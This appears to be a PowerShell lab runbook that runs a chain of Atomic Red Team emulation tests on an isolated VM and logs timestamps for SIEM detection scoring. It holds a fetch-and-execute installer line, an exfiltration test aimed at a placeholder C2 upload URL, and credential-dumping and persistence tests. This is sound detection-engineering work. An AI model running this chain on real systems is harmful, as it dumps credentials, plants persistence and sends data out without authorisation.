<#
.SYNOPSIS
  Week 9 - run the Operation INVOICE STORM Atomic Red Team tests on the lab VM
  and write a UTC run log that the SIEM analysis uses to attribute detections.

.DESCRIPTION
  Run ONLY on the isolated lab VM LAB-WIN10-01 (snapshot first, see
  week8/plan/emulation_plan.yaml rules of engagement). Requires the
  Invoke-AtomicRedTeam module and an elevated PowerShell for steps 6-7.

  Each test is addressed by its Atomic GUID (pinned in atomics/selected_tests.json,
  atomic-red-team commit a0e3f9bc69). For every step the script records
  start/end UTC timestamps to run_log.csv; export the Sysmon events for the window
  from Splunk and replace data/atomic_run_telemetry.ndjson with them, then rerun
  scripts/run_siem.py to score the real run.

.EXAMPLE
  PS> Set-ExecutionPolicy -Scope Process Bypass
  PS> .\Invoke-Week9Atomics.ps1 -PauseSeconds 300 -IncludeOptional
#>
[CmdletBinding()]
param(
    [int]$PauseSeconds = 300,
    [switch]$IncludeOptional,
    [string]$C2Url = "http://198.51.100.25:8080/upload",
    [string]$LogPath = ".\run_log.csv"
)

$ErrorActionPreference = "Stop"
if ($env:COMPUTERNAME -ne "LAB-WIN10-01") {
    throw "Refusing to run: this runbook is for the isolated lab VM LAB-WIN10-01 only."
}

# Install the execution framework once (lab VM only).
if (-not (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
    IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
    Install-AtomicRedTeam -getAtomics -Force
}
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

# step, technique, GUID, optional, extra input args
$plan = @(
    @{ Step = 1; T = "T1566.001"; Guid = "114ccff9-ae6d-4547-9ead-4cd69f687306"; Opt = $false; Args = @{} },
    @{ Step = 2; T = "T1566.001"; Guid = "cbb6799a-425c-4f83-9194-5447a909d67f"; Opt = $false; Args = @{} },
    @{ Step = 3; T = "T1059.001"; Guid = "a538de64-1c74-46ed-aa60-b995ed302598"; Opt = $false; Args = @{} },
    @{ Step = 4; T = "T1105";     Guid = "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0"; Opt = $false; Args = @{} },
    @{ Step = 5; T = "T1547.001"; Guid = "e55be3fd-3521-4610-9d1a-e210e42dcf05"; Opt = $false; Args = @{} },
    @{ Step = 6; T = "T1053.005"; Guid = "42f53695-ad4a-4546-abb6-7d837f644a71"; Opt = $false; Args = @{} },
    @{ Step = 7; T = "T1003.001"; Guid = "2536dee2-12fb-459a-8c37-971844fa73be"; Opt = $true;  Args = @{} },
    @{ Step = 8; T = "T1560.001"; Guid = "d1334303-59cb-4a03-8313-b3e24d02c198"; Opt = $false; Args = @{} },
    @{ Step = 9; T = "T1041";     Guid = "d1253f6e-c29b-49dc-b466-2147a6191932"; Opt = $false; Args = @{ destination_url = $C2Url } }
)

"step,technique,guid,start_utc,end_utc,executed,notes" | Out-File -FilePath $LogPath -Encoding utf8

foreach ($s in $plan) {
    if ($s.Opt -and -not $IncludeOptional) {
        "$($s.Step),$($s.T),$($s.Guid),,,no,optional step skipped" | Add-Content $LogPath
        continue
    }
    Write-Host "=== Step $($s.Step): $($s.T) $($s.Guid)" -ForegroundColor Cyan
    Invoke-AtomicTest $s.T -TestGuids $s.Guid -GetPrereqs | Out-Null
    $start = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    $ok = "yes"; $note = ""
    try {
        if ($s.Args.Count -gt 0) {
            Invoke-AtomicTest $s.T -TestGuids $s.Guid -InputArgs $s.Args -TimeoutSeconds 120
        } else {
            Invoke-AtomicTest $s.T -TestGuids $s.Guid -TimeoutSeconds 120
        }
    } catch { $ok = "error"; $note = $_.Exception.Message -replace ",", ";" }
    $end = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    "$($s.Step),$($s.T),$($s.Guid),$start,$end,$ok,$note" | Add-Content $LogPath
    Start-Sleep -Seconds 30          # let Sysmon/UF forward before cleanup
    Invoke-AtomicTest $s.T -TestGuids $s.Guid -Cleanup | Out-Null
    Start-Sleep -Seconds $PauseSeconds
}

Write-Host "Run complete. Log: $LogPath. Revert the VM snapshot now." -ForegroundColor Green
